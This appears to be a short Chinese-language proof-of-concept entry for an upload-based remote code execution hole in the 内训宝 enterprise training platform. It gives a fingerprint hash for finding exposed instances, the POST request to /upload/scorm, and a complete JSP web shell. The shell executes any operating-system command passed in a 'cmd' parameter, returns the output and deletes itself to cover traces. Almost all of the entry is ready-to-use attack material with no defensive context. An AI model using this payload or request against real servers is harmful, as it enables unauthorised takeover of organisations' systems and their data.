# 内训宝企业培训平台uploadscorm存在文件上传致RCE漏洞复

- **系统**：内训宝企业培训平台　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`icon_hash="-790843908"`
- **请求**：`POST /upload/scorm HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlA…`

**请求体 / payload**
```
------WebKitFormBoundaryFfJZ4PlAZBixjELj
Content-Disposition: form-data; name="fileupload"; filename="test.jsp"
Content-Type: application/octet-stream
<% java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();int a = -1;byte[] b = new byte[2048];out.print("<pre>");while((a=in.read(b))!=-1){out.println(new String(b,0,a));}out.print("</pre>");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
------WebKitFormBoundaryFfJZ4PlAZBixjELj--
```
- **预期**：200　|　—